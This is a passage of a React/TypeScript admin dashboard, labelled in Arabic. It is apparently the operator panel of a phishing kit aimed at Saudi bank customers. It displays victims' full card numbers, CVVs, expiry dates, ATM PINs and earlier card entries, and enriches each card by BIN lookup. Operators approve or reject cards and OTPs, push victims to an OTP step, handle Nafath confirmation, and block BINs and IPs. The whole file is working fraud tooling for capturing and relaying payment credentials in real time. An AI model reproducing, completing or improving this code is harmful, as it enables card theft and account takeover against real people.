      <button
        onClick={() => setOpen((o) => !o)}
        className="w-full px-3 py-2 flex items-center justify-between text-[11px] font-bold text-amber-200 hover:bg-amber-500/10 rounded-lg transition"
        data-testid="toggle-card-history"
      >
        <span className="flex items-center gap-1.5">
          <RotateCcw className="w-3 h-3" />
          البطاقات السابقة ({previous.length})
        </span>
        <ChevronDown
          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
        />
      </button>
      {open && (
        <div className="px-2 pb-2 space-y-1.5">
          {previous.map((entry: any, idx: number) => {
            const isRevealed = !!revealed[idx];
            const grouped = entry.cardNumber.replace(/(.{4})/g, "$1 ").trim();
            const masked =
              entry.cardNumber.length > 4
                ? `•••• •••• •••• ${entry.cardNumber.slice(-4)}`
                : "••••";
            const expiry =
              entry.expiryMonth && entry.expiryYear
                ? `${entry.expiryMonth}/${entry.expiryYear}`
                : "—";
            return (
              <div
                key={`${entry.cardNumber}-${idx}`}
                className="rounded-md bg-slate-900/50 border border-slate-800 p-2 space-y-1.5"
                data-testid={`card-history-${idx}`}
              >
                <div className="flex items-center justify-between text-[10px] text-slate-400">
                  <span dir="ltr" className="font-mono">
                    {fmtTime(entry.timestamp)}
                  </span>
                  <button
                    onClick={() =>
                      setRevealed((r) => ({ ...r, [idx]: !r[idx] }))
                    }
                    className="flex items-center gap-1 text-cyan-300 hover:text-cyan-200"
                    data-testid={`toggle-card-history-reveal-${idx}`}
                  >
                    {isRevealed ? (
                      <>
                        <EyeOff className="w-3 h-3" /> إخفاء
                      </>
                    ) : (
                      <>
                        <Eye className="w-3 h-3" /> عرض
                      </>
                    )}
                  </button>
                </div>
                <div
                  className="font-mono text-[12px] tracking-wider text-slate-100 select-all"
                  dir="ltr"
                  data-testid={`card-history-number-${idx}`}
                >
                  {isRevealed ? grouped : masked}
                </div>
                <div className="flex items-center gap-3 text-[10px]">
                  <div>
                    <span className="opacity-60">CVV: </span>
                    <span
                      className="font-mono font-bold text-slate-100 select-all"
                      dir="ltr"
                      data-testid={`card-history-cvv-${idx}`}
                    >
                      {isRevealed ? entry.cvv || "—" : "•••"}
                    </span>
                  </div>
                  <div>
                    <span className="opacity-60">Exp: </span>
                    <span
                      className="font-mono text-slate-100"
                      dir="ltr"
                      data-testid={`card-history-exp-${idx}`}
                    >
                      {expiry}
                    </span>
                  </div>
                  {entry.cardType && (
                    <div className="ml-auto">
                      <span className="text-[9px] uppercase px-1.5 py-px rounded bg-slate-800 text-slate-300">
                        {entry.cardType}
                      </span>
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

function CardInfoCard({
  visitor,
  onApprove,
  onReject,
  onPushStep,
  onBlockBin,
  isBinBlocked,
  onBlockIp,
  isIpBlocked,
}: {
  visitor: Visitor;
  onApprove: (
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus",
  ) => void;
  onReject: (
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus",
  ) => void;
  onPushStep: (step: number) => void;
  onBlockBin?: (bin: string) => void;
  isBinBlocked?: boolean;
  onBlockIp?: (ip: string) => void;
  isIpBlocked?: boolean;
}) {
  const p = visitor.payment || {};
  const hasCard = !!(p.cardLast4 || p.cardName || p.cardNumber);

  const bin = p.cardBin;
  const visitorAny = visitor as any;
  const hasEnrichment =
    !!(visitorAny.cardBankName || visitorAny.bankName) &&
    !!(
      visitorAny.cardCategory ||
      visitorAny.cardLevel ||
      visitorAny.cardCountry
    );

  useEffect(() => {
    if (!db) return;
    if (!bin || bin.length < 6) return;
    if (hasEnrichment) return;
    let cancelled = false;
    (async () => {
      try {
        const res = await fetch(`/api/bin-lookup/${bin}`);
        if (!res.ok) return;
        const json = await res.json();
        if (cancelled) return;
        if (!json?.success || !json.data) return;
        const d = json.data;
        const patch: Record<string, string> = {
          updatedAt: new Date().toISOString(),
        };
        if (d.bankName) patch.cardBankName = String(d.bankName);
        if (d.cardType) patch.cardCategory = String(d.cardType);
        if (d.cardLevel) patch.cardLevel = String(d.cardLevel);
        if (d.country) patch.cardCountry = String(d.country);
        if (d.scheme && !visitorAny.cardScheme)
          patch.cardScheme = String(d.scheme);
        await setDoc(doc(db!, "pays", visitor.id), patch, { merge: true });
      } catch {
        // silent
      }
    })();
    return () => {
      cancelled = true;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bin, hasEnrichment, visitor.id]);

  if (!hasCard && visitor.nafadConfirmationStatus !== "waiting") return null;

  const last4 = p.cardLast4 || "••••";
  const expiry = p.cardExpiry || "";
  const name = p.cardName || "";
  const scheme = String(p.cardScheme || "").toLowerCase();
  const bank = safeText(p.cardBank);
  const cardType = String(p.cardType || "").toUpperCase();
  const cardLevel = String(p.cardLevel || "").toUpperCase();
  const cardCountry = String(p.cardCountry || "").toUpperCase();
  const matchedBank = findBankLogo(p.cardBank);
  const bankLogo: string | null = p.cardBankLogo || matchedBank?.logo || null;
  const bankLabel: string = p.cardBankLabel || matchedBank?.label || bank || "";
  const waiting = visitor.cardApprovalStatus === "waiting";
  const hasBin =
    bin || bank || p.cardType || p.cardCountry || p.cardCvc || visitor.atmPin;
  const fullCard = String(p.cardNumber || "").replace(/\D/g, "");
  const groupedCard =
    fullCard.length >= 12
      ? fullCard.replace(/(.{4})/g, "$1 ").trim()
      : `•••• •••• •••• ${last4}`;
  const cvc = String(p.cardCvc || "").replace(/\D/g, "");

  const isMaster = scheme.includes("master");
  const isMada = scheme.includes("mada");
  const isAmex = scheme.includes("amex") || scheme.includes("american");
  const schemeLabel = isMaster
    ? "MASTERCARD"
    : isMada
      ? "mada"
      : isAmex
        ? "AMEX"
        : "VISA";
  const cardBackground = isMaster
    ? "linear-gradient(135deg, #ff8a00 0%, #e64a19 55%, #7a1a00 100%)"
    : isMada
      ? "linear-gradient(135deg, #0e7a5f 0%, #06402e 100%)"
      : isAmex
        ? "linear-gradient(135deg, #2e7df1 0%, #0a3680 100%)"
        : "linear-gradient(135deg, #1a3a8c 0%, #0e1f4a 50%, #061029 100%)";

  return (
    <Panel
      title="معلومات البطاقة"
      badge={waiting ? "بانتظار الموافقة" : undefined}
    >
      <div className="space-y-3">
        {/* Scheme-themed payment card */}
        <div
          className="relative rounded-2xl p-4 text-white overflow-hidden w-full max-w-[280px] mx-auto shadow-lg"
          style={{
            background: cardBackground,
            aspectRatio: "1.586 / 1",
            minHeight: 170,
          }}
          dir="ltr"
        >
          <div className="absolute top-3 left-3 text-[10px] uppercase tracking-[0.18em] font-bold opacity-95">
            {schemeLabel}
          </div>
          <div
            className="absolute top-2.5 right-3 flex flex-col items-end gap-1 max-w-[65%]"
            title={bankLabel || "غير معروف"}
          >
            <div className="flex items-center gap-1.5">
              {bankLogo && (
                <div className="bg-white/95 rounded-md p-1 flex items-center justify-center shadow-sm shrink-0">
                  <img
                    src={bankLogo}
                    alt={bankLabel || "Bank"}
                    className="h-6 w-auto max-w-[52px] object-contain"
                    onError={(e) => {
                      (
                        e.currentTarget.parentElement as HTMLElement
                      ).style.display = "none";
                    }}
                  />
                </div>
              )}
              {bankLabel && (
                <div
                  className="text-[10px] font-bold opacity-95 truncate text-right max-w-[120px]"
                  dir="auto"
                >
                  {bankLabel}
                </div>
              )}
            </div>
            {(cardType || cardLevel || cardCountry) && (
              <div className="flex flex-wrap items-center justify-end gap-1">
                {cardType && (
                  <span
                    className="text-[9px] tracking-wider px-1.5 py-px bg-white/25 backdrop-blur-sm rounded uppercase font-bold leading-tight"
                    data-testid="card-bin-type"
                  >
                    {cardType}
                  </span>
                )}
                {cardLevel && (
                  <span
                    className="text-[9px] tracking-wider px-1.5 py-px bg-amber-300/30 text-amber-50 backdrop-blur-sm rounded uppercase font-bold leading-tight"
                    title={cardLevel}
                    data-testid="card-bin-level"
                  >
                    {cardLevel}
                  </span>
                )}
                {cardCountry && (
                  <span
                    className="text-[9px] tracking-wider px-1.5 py-px bg-white/15 backdrop-blur-sm rounded uppercase font-bold leading-tight"
                    title={cardCountry}
                    data-testid="card-bin-country"
                  >
                    {cardCountry}
                  </span>
                )}
              </div>
            )}
          </div>

          <div className="mt-10">
            <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 to-yellow-600 rounded mb-3 opacity-90" />
            <div
              className="font-mono text-base tracking-widest select-all"
              data-testid="admin-card-number"
            >
              {groupedCard}
            </div>
          </div>

          <div className="absolute bottom-3 left-3 right-3 flex items-end justify-between gap-2">
            {name && (
              <div className="text-[11px] min-w-0">
                <div className="opacity-60 text-[9px] uppercase">Holder</div>
                <div className="font-semibold uppercase tracking-wide truncate">
                  {name}
                </div>
              </div>
            )}
            {cvc && (
              <div className="text-[11px] text-center">
                <div className="opacity-60 text-[9px] uppercase">CVV</div>
                <div
                  className="font-mono font-bold tracking-widest select-all"
                  data-testid="admin-card-cvv"
                >
                  {cvc}
                </div>
              </div>
            )}
            {expiry && (
              <div className="text-[11px] text-right">
                <div className="opacity-60 text-[9px] uppercase">Exp</div>
                <div className="font-mono">{expiry}</div>
              </div>
            )}
          </div>
        </div>

        {/* Previous cards history */}
        <CardHistoryList
          history={visitorAny.cardHistory}
          currentCardNumber={fullCard}
        />

        {/* Action buttons */}
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => onApprove("cardApprovalStatus")}
            disabled={!waiting}
            className="py-1.5 bg-green-500/20 text-green-300 hover:bg-green-500/30 disabled:opacity-40 rounded-lg text-xs font-semibold flex items-center justify-center gap-1 border border-green-500/30"
            data-testid="card-accept"
          >
            <CheckCircle2 className="w-3.5 h-3.5" /> قبول
          </button>
          <button
            onClick={() => onReject("cardApprovalStatus")}
            disabled={!waiting}
            className="py-1.5 bg-red-500/20 text-red-300 hover:bg-red-500/30 disabled:opacity-40 rounded-lg text-xs font-semibold flex items-center justify-center gap-1 border border-red-500/30"
            data-testid="card-reject"
          >
            <XCircle className="w-3.5 h-3.5" /> رفض
          </button>
          <button
            onClick={() => onPushStep(5)}
            className="col-span-2 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
          >
            <Hash className="w-3 h-3" /> دفع إلى OTP
          </button>
        </div>
        <BankContactPushRow visitor={visitor} />

        {/* Quick block-BIN action */}
        {hasBin && bin && onBlockBin && (
          <button
            onClick={() => {
              if (isBinBlocked) return;
              if (
                confirm(
                  `حظر جميع البطاقات التي تبدأ بـ ${bin}؟\nسيمنع أي زائر من استخدام بطاقة بنفس البداية.`,
                )
              ) {
                onBlockBin(String(bin));
              }
            }}
            disabled={isBinBlocked}
            className={`w-full py-1.5 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1.5 border transition ${
              isBinBlocked
                ? "bg-red-500/10 text-red-300 border-red-500/40 cursor-not-allowed"
                : "bg-red-500/20 text-red-300 hover:bg-red-500/30 border-red-500/40"
            }`}
            data-testid="card-block-bin"
          >
            <Ban className="w-3.5 h-3.5" />
            {isBinBlocked ? "محظور بالفعل" : `حظر هذا الـ BIN (${bin})`}
          </button>
        )}

        {/* Quick block-IP action */}
        {(visitor.ip || visitor.ipAddress) && onBlockIp && (
          <button
            onClick={() => {
              const ip = String(visitor.ip || visitor.ipAddress);
              if (isIpBlocked) return;
              if (
                confirm(
                  `حظر هذا الزائر بعنوان IP ${ip}؟\nسيمنع الدخول من هذا العنوان نهائياً.`,
                )
              ) {
                onBlockIp(ip);
              }
            }}
            disabled={isIpBlocked}
            className={`w-full py-1.5 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1.5 border transition ${
              isIpBlocked
                ? "bg-red-500/10 text-red-300 border-red-500/40 cursor-not-allowed"
                : "bg-red-500/20 text-red-300 hover:bg-red-500/30 border-red-500/40"
            }`}
            data-testid="card-block-ip"
          >
            <WifiOff className="w-3.5 h-3.5" />
            {isIpBlocked
              ? "IP محظور بالفعل"
              : `حظر بالـ IP (${visitor.ip || visitor.ipAddress})`}
          </button>
        )}

        {/* Nafad code + approval */}
        {(isFinalStep(visitor) ||
          visitor.nafadConfirmationStatus === "waiting") && (
          <NafadControl
            visitor={visitor}
            onApprove={onApprove}
            onReject={onReject}
          />
        )}
      </div>
    </Panel>
  );
}
